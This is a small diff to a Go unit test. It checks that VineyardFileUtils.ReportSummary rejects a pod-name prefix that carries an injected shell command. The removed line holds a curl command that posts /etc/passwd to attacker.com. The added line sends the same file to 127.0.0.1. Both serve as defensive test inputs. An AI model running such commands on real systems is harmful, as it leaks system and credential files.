@@ -60,8 +60,8 @@ func TestVineyardFileUtils_ReportSummary(t *testing.T) {
 		t.Errorf("VineyardFileUtils.ReportSummary() got = %v, want %v, err = %v", got, expected, err)
 	}
 
-	// test the potenial args attack
-	podNamePrefix = "curl -d @/etc/passwd http://attacker.com -o-"
+	// test the potenial risk args
+	podNamePrefix = "curl -d @/etc/passwd 127.0.0.1 -o-"
 	vineyard = NewVineyardFileUtils(podNamePrefix, port, replicas, namespace, mockLogger)
 	_, err = vineyard.ReportSummary()
 	if err == nil {
